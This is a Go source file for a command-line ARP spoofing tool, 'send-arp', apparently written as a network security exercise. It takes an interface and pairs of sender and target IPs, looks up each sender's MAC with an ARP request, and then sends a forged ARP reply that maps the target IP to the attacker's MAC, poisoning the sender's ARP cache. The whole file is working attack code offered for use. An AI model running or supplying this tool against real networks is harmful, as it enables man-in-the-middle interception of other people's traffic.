package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const BUFSIZ int32 = 512

var attackerIP net.IP
var attackerMAC net.HardwareAddr

var senderMAC net.HardwareAddr

var senderIPs []net.IP
var targetIPs []net.IP

func getAttackerIP() net.IP {
	if addrs, err := net.InterfaceAddrs(); err != nil {
		panic(err)
	} else {
		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if ok && !ipNet.IP.IsLoopback() && ipNet.IP.To4() != nil {
				return ipNet.IP
			}
		}
		panic("Cannot get local IP address")
	}
}

func getAttackerMAC(intf string) net.HardwareAddr {
	if netIntf, err := net.InterfaceByName(intf); err != nil {
		panic(err)
	} else {
		return netIntf.HardwareAddr
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n")
		fmt.Printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n")
		panic("Invalid usage")
	}

	var intf string = os.Args[1]

	for i := 2; i < len(os.Args); i++ {
		ipAddr := net.ParseIP(os.Args[i])
		if ipAddr == nil {
			fmt.Printf("Invalid format of IP address: %s\n", os.Args[i])
			panic("Invalid IP format")
		}
		if i%2 == 0 {
			senderIPs = append(senderIPs, ipAddr)
		} else {
			targetIPs = append(targetIPs, ipAddr)
		}
	}

	if len(senderIPs) != len(targetIPs) {
		fmt.Printf("Invalid matching of IP pairs: %d sender ips, %d target ips\n", len(senderIPs), len(targetIPs))
		panic("Invalid IP pair matching")
	}

	attackerIP = getAttackerIP()
	fmt.Printf("attackerIP: %s\n", attackerIP) // !debug
	attackerMAC = getAttackerMAC(intf)
	fmt.Printf("attackerMAC: %s\n", attackerMAC) // !debug

	if handle, err := pcap.OpenLive(intf, BUFSIZ, true, time.Second); err != nil {
		fmt.Printf("couldn't open device %s\n", intf)
		panic(err)
	} else {
		for i := range len(senderIPs) {
			/** Get senderMAC */
			ethernetLayer1 := &layers.Ethernet{
				SrcMAC:       attackerMAC,
				DstMAC:       layers.EthernetBroadcast,
				EthernetType: layers.EthernetTypeARP,
			}
			arpLayer1 := &layers.ARP{
				AddrType:          layers.LinkTypeEthernet,
				Protocol:          layers.EthernetTypeIPv4,
				HwAddressSize:     6,
				ProtAddressSize:   4,
				Operation:         layers.ARPRequest,
				SourceHwAddress:   attackerMAC,
				SourceProtAddress: attackerIP,
				DstHwAddress:      net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
				DstProtAddress:    senderIPs[i],
			}
			buf1 := gopacket.NewSerializeBuffer()
			opts1 := gopacket.SerializeOptions{}
			gopacket.SerializeLayers(buf1, opts1,
				ethernetLayer1,
				arpLayer1,
			)
			if err = handle.WritePacketData(buf1.Bytes()); err != nil {
				panic("Error sending packet to network device")
			} else {
				packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
				for packet := range packetSource.Packets() {
					if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
						arp, _ := arpLayer.(*layers.ARP)
						if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
							senderMAC = arp.SourceHwAddress
							break
						}
					}
				}
			}
			fmt.Printf("[+] Successfully got MAC address of %s\n", senderIPs[i])
			fmt.Printf("senderMAC: %s\n", senderMAC) // !debug

			/** Send Infection packet to poison ARP table */
			ethernetLayer2 := &layers.Ethernet{
				SrcMAC:       attackerMAC,
				DstMAC:       senderMAC,
				EthernetType: layers.EthernetTypeARP,
			}
			arpLayer2 := &layers.ARP{
				AddrType:          layers.LinkTypeEthernet,
				Protocol:          layers.EthernetTypeIPv4,
				HwAddressSize:     6,
				ProtAddressSize:   4,
				Operation:         layers.ARPReply,
				SourceHwAddress:   attackerMAC,
				SourceProtAddress: targetIPs[i],
				DstHwAddress:      senderMAC,
				DstProtAddress:    senderIPs[i],
			}
			buf2 := gopacket.NewSerializeBuffer()
			opts2 := gopacket.SerializeOptions{}
			gopacket.SerializeLayers(buf2, opts2,
				ethernetLayer2,
				arpLayer2,
			)
			if err = handle.WritePacketData(buf2.Bytes()); err != nil {
				panic("Error sending packet to network device")
			}
			fmt.Printf("[+] Successfully poisoned ARP table of %s\n", senderIPs[i])

		}
	}
}
